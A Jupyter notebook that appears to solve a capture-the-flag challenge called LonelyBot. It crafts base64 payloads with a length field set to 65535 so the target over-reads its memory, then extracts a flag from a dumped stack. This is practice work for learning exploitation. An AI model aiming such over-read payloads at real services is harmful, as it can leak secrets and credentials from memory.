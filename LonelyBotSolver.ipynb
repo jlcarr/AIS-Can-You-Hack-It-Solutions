{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0911630a",
   "metadata": {},
   "outputs": [],
   "source": [
    "import base64\n",
    "import struct"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "21fc6182",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Simplest input: no message contents\n",
    "ushort_max = 2**16-1\n",
    "print(base64.b64encode(struct.pack(\"HH\",69,ushort_max)).decode())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "efc062b5",
   "metadata": {},
   "outputs": [],
   "source": [
    "# longest possible message\n",
    "import math\n",
    "b64bits = int(math.log2(64))  # == 6\n",
    "maxbytes = 50\n",
    "# maxbytes * b64bits >= (2+2+nchar)*8 and (2+2+nchar)*8 % b64bits == 0\n",
    "nchar = maxbytes * b64bits // 8 -2 -2  # >= nchar\n",
    "nchar = (2+2+nchar)*8 //b64bits*b64bits //8-2-2  # This removes the remainder via truncation\n",
    "print(\"Longest possible message length:\", nchar)\n",
    "\n",
    "print(base64.b64encode(struct.pack(f\"HH{nchar}s\", 69, ushort_max, b'A'*nchar)).decode())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "408f29c5",
   "metadata": {},
   "outputs": [],
   "source": [
    "with open('lonelybot-stack','r') as f:\n",
    "    stack_string = f.read()\n",
    "stack_contents = bytes.fromhex(stack_string)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fad088b1",
   "metadata": {},
   "outputs": [],
   "source": [
    "flag_location = stack_contents.find(b'--flag')\n",
    "print(stack_contents[flag_location:].split(b'\\x00')[1].decode())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "25eb9050",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
